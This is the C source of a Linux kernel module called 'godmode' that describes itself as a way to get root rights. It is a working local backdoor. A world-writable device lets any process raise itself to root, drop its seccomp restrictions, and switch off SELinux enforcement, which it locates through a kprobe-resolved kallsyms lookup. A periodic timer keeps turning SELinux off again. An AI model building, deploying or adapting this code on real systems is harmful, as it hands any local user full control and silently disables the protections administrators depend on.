// SPDX-License-Identifier: GPL-2.0-only
//
#define pr_fmt(fmt) "godmode: " fmt

#include <linux/device/class.h>
#include <linux/device.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/cdev.h>
#include <linux/sched/signal.h>
#include <linux/kprobes.h>
#include <linux/kernfs.h>
#include <linux/namei.h>
#include <asm/preempt.h>


#define GODMODE_CHARDEV_NAME 		"godmode"
#define GODMODE_MAJOR				(42)
#define GODMODE_MAX_MINORS			(1)
#define GODMODE_PERIODIC_TICK_MS	(4000)

#define GODMODE_DISABLE_SECCOMP _IOC(_IOC_WRITE, 'k', 1, 0) 
#define GODMODE_ENABLE_ROOT		_IOC(_IOC_WRITE, 'k', 2, 0)
#define GODMODE_DISABLE_SELINUX	_IOC(_IOC_WRITE, 'k', 3, 0)

#define GODMODE_DEV_CLASS_MODE	((umode_t)0666)//(S_IRUGO|S_IWUGO))

MODULE_DESCRIPTION("pwn express to get godmode root rights");
MODULE_AUTHOR("uglycat");
MODULE_LICENSE("GPL");

static int godmode_open(struct inode *inode, struct file *file);
static int godmode_release(struct inode *inode, struct file *file);
static long godmode_unlocked_ioctl(struct file *file, unsigned int cmd,
			       unsigned long arg);
static char *godmode_devnode(const struct device *dev, umode_t *mode);
static int godmode_uevent(const struct device *dev, struct kobj_uevent_env *env);

static int godmode_major;
static struct device *godmode_dev;
static struct hrtimer hrtimer_work;
static bool was_selinux_enabled;

/* Define this as is not accessible by the module by default */
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t kallsyms_lookup_name_cb;

static struct class godmode_class =
{
	.name		= GODMODE_CHARDEV_NAME,
	.devnode	= godmode_devnode,
	.dev_uevent = godmode_uevent,
};

static const struct file_operations fops = {
	.open		= godmode_open,
	.release	= godmode_release,
	.unlocked_ioctl = godmode_unlocked_ioctl,

	.owner = THIS_MODULE,
};

static int godmode_open(struct inode *inode, struct file *file)
{
	return 0;
}

static int godmode_release(struct inode *inode, struct file *file)
{
	return 0;
}

/* Set the TIF_SECCOMP flag in the thread_info structure to disabled */
static void godmode_set_seccomp_flag_off(void)
{
	struct thread_info *ti = current_thread_info();
	
	ti->flags = ti->flags & ~(1 << TIF_SECCOMP);
}

/* Disables seccomp for the task that calls this */
static void godmode_set_secomp_disabled(void)
{
	struct task_struct *ts = current;
	struct seccomp *task_seccomp = &ts->seccomp;

	task_seccomp->mode = SECCOMP_MODE_DISABLED;
}

static void godmode_enable_root(void)
{
	kuid_t kuid = KUIDT_INIT(0);
	kgid_t kgid = KGIDT_INIT(0);
	struct cred *new_cred;

	new_cred = prepare_creds();
	new_cred->uid = kuid;
	new_cred->gid = kgid;
	new_cred->euid = kuid;
	new_cred->egid = kgid;

	commit_creds(new_cred);
}

static int godmode_uevent(const struct device *dev, struct kobj_uevent_env *env)
{
	add_uevent_var(env, "DEVMODE=%#o", 0666);
	return 0;
}

/* Register kprobes to get the address of the kallsyms_lookup_name */
static void *godmode_get_kernel_function(const char *f_name)
{
	int ret;
	void *addr;
	struct kprobe kp = {
		.symbol_name = f_name,
	};

	ret = register_kprobe(&kp);
	if (ret) {
		pr_err("[!] cannot register kprobe\n");
		return NULL;
	}

	addr = kp.addr;
	unregister_kprobe(&kp);

	return addr; 
}

/* We cannot access directly the offsetof(struct selinux_state, enforcing)
 * assuming this is 0 without structure randomization layout.
 *
 */
static int godmode_get_enforcing_offset(void)
{
	return 0;
}

/* Return the selinux_state address */
static void *godmode_get_selinux_state_addr(void)
{
	unsigned long selinux_state;

	if (kallsyms_lookup_name_cb == NULL) {
		pr_err("[!] Get kallsyms_lookup_name address\n");
		return NULL;
	}

	selinux_state = kallsyms_lookup_name_cb("selinux_state");
	return (void *)selinux_state;
}

static bool godmode_is_selinux_enabled(void)
{
	void *selinux_state_addr = godmode_get_selinux_state_addr();
	
	return !selinux_state_addr ? true :
		*(bool *)(selinux_state_addr + godmode_get_enforcing_offset());
}

static void godmode_disable_selinux(void)
{
	void *selinux_state_addr = godmode_get_selinux_state_addr();
	if (!selinux_state_addr) {
		pr_err("[!] Cannot get selinux_state addr\n");
		return;
	}

	memset(selinux_state_addr + godmode_get_enforcing_offset(), 0, sizeof(bool));
	pr_info("[!] Disabled SELinux\n");
}

static const char *get_command_str(unsigned int cmd)
{
	switch (cmd) {
		case GODMODE_DISABLE_SECCOMP:
			return "disable_seccomp";

		case GODMODE_ENABLE_ROOT:
			return "enable_root";

		case GODMODE_DISABLE_SELINUX:
			return "disable_selinux";

		default:
			return "unknown";
	}
}

static long godmode_unlocked_ioctl(struct file *file, unsigned int cmd,
								   unsigned long arg)
{
	pr_info("ioctl cmd:%s\n", get_command_str(cmd));

	switch (cmd) {
		case GODMODE_DISABLE_SECCOMP:
			godmode_set_seccomp_flag_off();
			godmode_set_secomp_disabled();
			break;

		case GODMODE_ENABLE_ROOT:
			godmode_enable_root();
			break;

		case GODMODE_DISABLE_SELINUX:
			godmode_disable_selinux();
			break;

		default:
			return -EINVAL;
	}

	return 0L;
}

static char *godmode_devnode(const struct device *dev, umode_t *mode)
{
	if (mode != NULL)
		*mode = GODMODE_DEV_CLASS_MODE;

	return NULL;
}

static enum hrtimer_restart hrtimer_deffered_work(struct hrtimer *hrtimer)
{
	bool selinux_state;
	bool selinux_has_changed;

	selinux_state = godmode_is_selinux_enabled();
	selinux_has_changed = selinux_state ^ was_selinux_enabled;

	if (selinux_has_changed) {
		pr_info("[!] SELinux enabled: %d\n", selinux_state);
		was_selinux_enabled = selinux_state;
	}

	if (selinux_state)
		godmode_disable_selinux();	

	hrtimer_forward_now(hrtimer, ms_to_ktime(GODMODE_PERIODIC_TICK_MS));
	return HRTIMER_RESTART;
}

static int godmode_init(void)
{
	int ret = 0;
	godmode_major = register_chrdev(0, GODMODE_CHARDEV_NAME, &fops);
	if (godmode_major < 0) {
		pr_err("register chardev\n");
		return godmode_major;
	}

 	ret = class_register(&godmode_class);
	if (ret) {
		pr_err("register\n");
		goto cleanup_unregister;
	}

	godmode_dev = device_create(&godmode_class, NULL, MKDEV(godmode_major, 0),
								NULL, GODMODE_CHARDEV_NAME);	
	if (!godmode_dev) {
		ret = -ENODEV;
		goto cleanup_class;
	}

	kallsyms_lookup_name_cb = godmode_get_kernel_function("kallsyms_lookup_name");
	
	if (godmode_is_selinux_enabled()) {
		pr_info("[!] SELinux is enabled\n");
	} else {
		pr_info("[!] SELinux is disabled\n");
	}

	hrtimer_init(&hrtimer_work, CLOCK_MONOTONIC, HRTIMER_MODE_REL);
	hrtimer_work.function = hrtimer_deffered_work;
	hrtimer_start(&hrtimer_work, ms_to_ktime(GODMODE_PERIODIC_TICK_MS),
				  HRTIMER_MODE_REL_PINNED);
	return 0;

cleanup_class:
	class_unregister(&godmode_class);
cleanup_unregister:
	unregister_chrdev(godmode_major, GODMODE_CHARDEV_NAME);
	godmode_major = -1;
	return ret;
}

static void godmode_exit(void)
{
	hrtimer_cancel(&hrtimer_work);
	device_destroy(&godmode_class, MKDEV(godmode_major, 0));
	class_unregister(&godmode_class);
	unregister_chrdev(godmode_major, GODMODE_CHARDEV_NAME);
}

module_init(godmode_init);
module_exit(godmode_exit);
